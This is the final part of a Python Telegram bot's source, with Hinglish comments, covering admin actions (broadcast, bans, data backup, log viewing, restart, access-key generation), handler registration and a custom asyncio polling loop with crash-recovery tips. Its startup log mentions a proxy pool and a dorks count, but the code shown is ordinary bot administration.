        return await ed(H("ADMIN — BROADCAST") + "\n\nAb message bhejo — sab users ko jayega.\n"
                        "<i>Cancel: /admin</i>",
                        InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data="a:home")]]))
    if action == "bans":
        lst = [(u, r) for u, r in USERS.items() if r.get("banned")]
        body = "\n".join("• <code>%s</code> %s" % (u, esc((r.get("name") or "?")[:18])) for u, r in lst) or "—"
        return await ed(H("ADMIN — BANS", "%d banned" % len(lst)) + "\n\n" + body +
                        "\n\n<i>Ban/unban: /ban &lt;id&gt; , /unban &lt;id&gt;</i>")
    if action == "backup":
        name = os.path.join(DUMP_DIR, "backup_%s.zip" % stamp())
        with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in ("users.json", "keys.json", "settings.json", "proxies.json"):
                p = _path(f)
                if os.path.exists(p):
                    zf.write(p, arcname=f)
        await send_file(update, name, "💾 backup")
        return
    if action == "logs":
        p = os.path.join(BASE_DIR, "bot.log")
        tail = "—"
        if os.path.exists(p):
            try:
                with open(p, encoding="utf-8", errors="ignore") as f:
                    tail = "".join(f.readlines()[-25:])
            except Exception:
                tail = "—"
        for ch in chunk_lines(H("ADMIN — LOGS") + "\n\n<pre>%s</pre>" % esc(tail[-3500:]))[:2]:
            try:
                await q.message.reply_text(ch, parse_mode=ParseMode.HTML)
            except Exception:
                pass
        return

    if action == "restart":
        try:
            await q.edit_message_text("🔄 Restarting…", parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await asyncio.sleep(0.5)
        os.execv(sys.executable, [sys.executable, os.path.abspath(__file__)] + sys.argv[1:])
        return

    if action == "sys":
        try:
            import platform
            txt = (H("ADMIN — SYSTEM") + "\n\n"
                   "🐍 %s %s\n🖥 %s\n🐍 Python %s\n"
                   "📁 %s\n🧵 PID %d\n📊 Lines %d"
                   % (BRAND, VERSION, esc(platform.platform()[:48]),
                      esc(platform.python_version()), esc(BASE_DIR), os.getpid(),
                      len(open(os.path.abspath(__file__), encoding="utf-8").readlines())))
        except Exception as exc:
            txt = "❌ %s" % exc
        return await ed(txt)

    await ed("❓ Unknown action", kb_admin())


# ── admin text commands ──────────────────────────────────────────────────────
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.effective_message.reply_text("Usage: /ban <user_id>")
        return
    t = context.args[0]
    USERS.setdefault(t, {})["banned"] = True
    save_all()
    await update.effective_message.reply_text("🚫 Banned <code>%s</code>" % t, parse_mode=ParseMode.HTML)


async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.effective_message.reply_text("Usage: /unban <user_id>")
        return
    t = context.args[0]
    if t in USERS:
        USERS[t].pop("banned", None)
        save_all()
    await update.effective_message.reply_text("✅ Unbanned <code>%s</code>" % t, parse_mode=ParseMode.HTML)


async def cmd_addkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    days = 30
    if context.args:
        try:
            days = int(context.args[0])
        except Exception:
            pass
    key = "SNK-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4)) + "-" + \
          "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
    KEYS[key] = {"days": days, "created": datetime.now().isoformat(timespec="seconds")}
    save_all()
    await update.effective_message.reply_text(
        "🔑 <code>%s</code>\n📅 %d din" % (key, days), parse_mode=ParseMode.HTML)


AWAIT_HANDLERS["bc_text"] = lambda *a, **k: input_broadcast(*a, **k)


async def input_broadcast(update, context, text: str):
    if not is_admin(update.effective_user.id):
        return
    msg = await update.effective_message.reply_text("📣 Bheja ja raha hai…")
    sent, fail = 0, 0
    for uid in list(USERS.keys()):
        try:
            await context.bot.send_message(chat_id=int(uid), text=text)
            sent += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    try:
        await msg.edit_text("📣 <b>Broadcast done</b>\n\n✅ Sent: <code>%d</code>\n"
                            "❌ Fail: <code>%d</code>" % (sent, fail), parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════
async def on_error(update, context):
    logger.error("handler error: %s", context.error, exc_info=context.error)


def build_app() -> Application:
    app = ApplicationBuilder().token(TOKEN).concurrent_updates(True).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("myid", cmd_myid))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("addkey", cmd_addkey))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)
    return app


def _install_signals(stop_event) -> None:
    """SIGINT / SIGTERM pe clean shutdown."""
    def _stop(*_a):
        try:
            stop_event.set()
        except Exception:
            pass
    for name in ("SIGINT", "SIGTERM", "SIGHUP"):
        sig = getattr(signal, name, None)
        if sig is None:
            continue
        try:
            asyncio.get_running_loop().add_signal_handler(sig, _stop)
        except (NotImplementedError, RuntimeError, ValueError):
            try:
                signal.signal(sig, _stop)
            except Exception:
                pass


async def _serve(app, stop_ev=None) -> None:
    """Apna polling loop — asyncio.get_event_loop() use NAHI karta.

    PTB ka run_polling() Python 3.12+ / 3.14 pe 'There is no current event
    loop' deta hai, isliye yahan manually initialize/start/poll karte hain.
    """
    if stop_ev is None:
        stop_ev = asyncio.Event()
    _install_signals(stop_ev)
    await app.initialize()
    await app.start()
    await app.updater.start_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        poll_interval=0.5,
        timeout=30,
    )
    logger.info("✅ Polling chalu — bot zinda hai. (Ctrl+C ya ./stop.sh se band)")
    try:
        await stop_ev.wait()
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        logger.info("⏹ Band ho raha hai…")
        try:
            await app.updater.stop()
        except Exception:
            pass
        try:
            await app.stop()
        except Exception:
            pass
        try:
            await app.shutdown()
        except Exception:
            pass
        logger.info("👋 Band ho gaya.")


def _run_loop(app, stop_ev=None) -> None:
    """Naya event loop bana ke chalata hai (3.14 safe)."""
    try:
        loop = asyncio.new_event_loop()
    except Exception:
        loop = None
    if loop is None:
        asyncio.run(_serve(app, stop_ev))
        return
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_serve(app, stop_ev))
    except KeyboardInterrupt:
        pass
    finally:
        try:
            pending = asyncio.all_tasks(loop)
            for t in pending:
                t.cancel()
            if pending:
                loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
        except Exception:
            pass
        try:
            loop.run_until_complete(loop.shutdown_asyncgens())
        except Exception:
            pass
        try:
            asyncio.set_event_loop(None)
        except Exception:
            pass
        try:
            loop.close()
        except Exception:
            pass


def main():
    logger.info("🐍 %s CORE %s starting… (Python %s • PTB %s)",
                BRAND, VERSION, platform.python_version(),
                getattr(__import__("telegram"), "__version__", "?"))
    try:
        load_proxy_pool()
    except Exception:
        pass
    logger.info("✅ %s CORE ready — %d sources • %s dorks space",
                BRAND, len(PROXY_SOURCES), fmt(db_counts()["dorks"]))
    app = build_app()
    try:
        _run_loop(app)
    except KeyboardInterrupt:
        print("\n👋 Band kiya.")
    except Exception as exc:
        logger.exception("Bot crash: %s", exc)
        print("\n" + "=" * 62)
        print("  ❌ BOT CRASH: %s" % str(exc)[:200])
        print("=" * 62)
        print("  Jaanch ke points:")
        print("   • Token galat/revoke?     → ./setconfig.sh --token <naya>")
        print("   • 2 bot chal rahe?        → ./stop.sh && ./start.sh")
        print("   • Internet band?          → ping google.com")
        print("   • Purani file pe wapas    → ls backups/ ; cp backups/<file> snake_core.py")
        print("=" * 62 + "\n")
        raise


if __name__ == "__main__":
    main()
